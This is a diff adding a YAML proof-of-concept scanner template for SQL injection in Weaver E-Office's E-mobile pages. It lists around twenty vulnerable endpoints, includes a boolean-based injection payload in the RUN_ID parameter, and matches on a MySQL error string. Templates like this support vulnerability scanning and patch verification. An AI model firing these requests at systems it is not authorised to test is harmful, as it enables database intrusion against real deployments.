@@ -1,0 +1,27 @@
+name: poc-yaml-泛微-EOffice-sql
+description: "SQL注入"
+method: GET
+path:
+  - "/E-mobile/flowdo_page.php?diff=delete&RUN_ID=(SELECT%20(CASE%20WHEN%20(2080=2080)%20THEN%201%20ELSE%20(SELECT%204346%20UNION%20SELECT%201731)%20END))*"
+  - "/E-mobile/flowdo_page.php?diff=delete&flowid=1"
+  - "/E-mobile/flowimage_page.php?FLOW_ID=2"
+  - "/E-mobile/diaryother_page.php?searchword=23"
+  - "/E-mobile/create/ajax_do.php?diff=word&sortid=1"
+  - "/E-mobile/create/ajax_do.php?diff=word&idstr=1"
+  - "/E-mobile/flow/freeflowimg.php?RUN_ID="
+  - "/E-mobile/create/ajax_do.php?diff=addr&sortid=1"
+  - "/E-mobile/create/ajax_do.php?diff=addr&userdept=1"
+  - "/E-mobile/create/ajax_do.php?diff=addr&userpriv=1"
+  - "/E-mobile/create/ajax_do.php?diff=wordsearch&idstr=1"
+  - "/E-mobile/flow/flowhave_page.php?detailid=2,3"
+  - "/E-mobile/flow/flowtype_free.php?flowid=1"
+  - "/E-mobile/flow/flowtype_free.php?runid=1"
+  - "/E-mobile/flow/flowtype_other.php?flowid=1"
+  - "/E-mobile/flow/flowtype_other.php?runid=1"
+  - "/E-mobile/flow/freeflowimage_page.php?fromid=2"
+  - "/E-mobile/flow/freeflowimage_page.php?diff=new&runid=2"
+
+expression:
+  status: 200
+  body_any:
+    - "mysql_fetch_array"
